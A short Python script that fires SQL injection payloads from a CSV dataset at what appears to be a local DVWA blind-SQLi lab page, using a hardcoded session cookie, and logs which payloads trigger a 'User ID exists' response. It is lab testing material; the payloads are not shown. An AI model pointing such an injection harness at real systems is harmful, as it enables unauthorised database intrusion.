import requests
import time
from datetime import datetime

# =============================
# Configuration
# =============================

URL = "http://localhost:8081/vulnerabilities/sqli_blind/"

COOKIES = {
    "PHPSESSID": "2r2fmq5v6b26e6bd5mt8c6fb66",
    "security": "low"
}

DATASET_FILE = "rbsqli_dataset/rbsqli_dataset.csv"
LOG_FILE = "results.txt"


# =============================
# Counters
# =============================

total = 0
vulnerable = 0
safe = 0
errors = 0

start_time = time.time()

print("\nStarting SQL Injection Dataset Analysis\n")
print("Target:", URL)
print("Dataset:", DATASET_FILE)
print("--------------------------------------\n")


log = open(LOG_FILE, "w")
log.write("SQL Injection Dataset Results\n")
log.write("Start Time: " + str(datetime.now()) + "\n\n")


# =============================
# Testing Loop
# =============================

with open(DATASET_FILE) as file:

    for payload in file:

        payload = payload.strip()

        if payload == "":
            continue

        total += 1

        data = {
            "id": payload,
            "Submit": "Submit"
        }

        try:

            request_start = time.time()

            r = requests.get(
                URL,
                params=data,
                cookies=COOKIES,
                timeout=5
            )

            response_time = round(time.time() - request_start, 3)


            # Detect vulnerability
            if "User ID exists" in r.text:

                vulnerable += 1

                result = "VULNERABLE"

            else:

                safe += 1

                result = "SAFE"


            output = (
                f"[{total}] "
                f"{result} | "
                f"Status:{r.status_code} | "
                f"Time:{response_time}s | "
                f"Payload: {payload}"
            )

            print(output)

            log.write(output + "\n")


        except Exception as e:

            errors += 1

            error_msg = (
                f"[{total}] ERROR | Payload: {payload}"
            )

            print(error_msg)

            log.write(error_msg + "\n")


# =============================
# Final Statistics
# =============================

end_time = time.time()

duration = round(end_time - start_time, 2)

summary = f"""

=============================
FINAL RESULTS
=============================

Total Payloads Tested : {total}

Vulnerable Payloads   : {vulnerable}

Safe Payloads         : {safe}

Errors                : {errors}

Success Rate          : {round((vulnerable/total)*100,2)} %

Execution Time        : {duration} seconds

=============================

"""

print(summary)

log.write(summary)

log.close()
